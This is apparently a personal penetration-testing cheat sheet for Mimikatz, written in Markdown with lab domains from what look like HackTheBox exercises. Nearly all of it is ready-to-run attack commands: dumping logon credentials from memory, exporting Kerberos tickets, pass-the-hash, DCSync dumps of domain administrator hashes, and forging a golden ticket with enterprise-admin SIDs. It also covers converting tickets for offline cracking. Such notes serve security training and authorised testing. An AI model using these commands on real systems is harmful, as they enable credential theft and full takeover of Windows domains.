---
type: tool
category: windows
tags:
  - tool
---
# Overview
https://github.com/gentilkiwi/mimikatz/releases
## Quick Commands
### Dump Hashes
```powershell
./mimikatz.exe privilege::debug "sekurlsa::logonpasswords" exit > hashdump.txt
```

### Harvesting Ticket - Mimikatz
```powershell
./mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit > ticketharvest.txt
```
### Pass the Hash (SMB,RCP or Kerberos)
This command allows us to open the cmd (and other programs) in the context of another user.
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:USER /rc4:NTLM_HASH /domain:DOMAIN /run:cmd.exe" exit
```
Which enables us to e.g. connect to a share as the user:
```
net use Z: \\dc01.inlanefreight.htb\david
```

### Dump NTDS.DIT (mimikatz)
```bash
mimikatz "lsadump::dcsync /domain:NEXURA.HTB /user:Administrator" exit
```

#### Dump all NTLM-Hashes and Kerberos-Keys - Mimikatz
1. Run powershell in the context of the "DC-Sync user":
```powershell
runas /netonly /user:INLANEFREIGHT\adunn powershell
```
2. Dump DC-Sync data:
```powershell
.\mimikatz.exe
```

```powershell
privilege::debug
```

Dump Hash of specific user:
```powershell
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

#### Forging a Golden Ticket - Mimikatz
```powershell
./mimikatz.exe
```
The first SID is for the `Child domain` and the second SIDS is for the `Enterprise Admin` :
```powershell
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

#### Extracting Tickets from Memory - Mimikatz
1. Execute mimikat.exe
2. If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets.
```mimikatz
base64 /out:true
```
3. List the kerberos-tickets
```mimikatz
kerberos::list /export 
```
4. We can than copy the `base64-string` or `.kirbi file` to our attack box and bruteforce it.

The `base64-string file` can be transformed to a `.kirbi file` like that:
```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

## Important Parameter
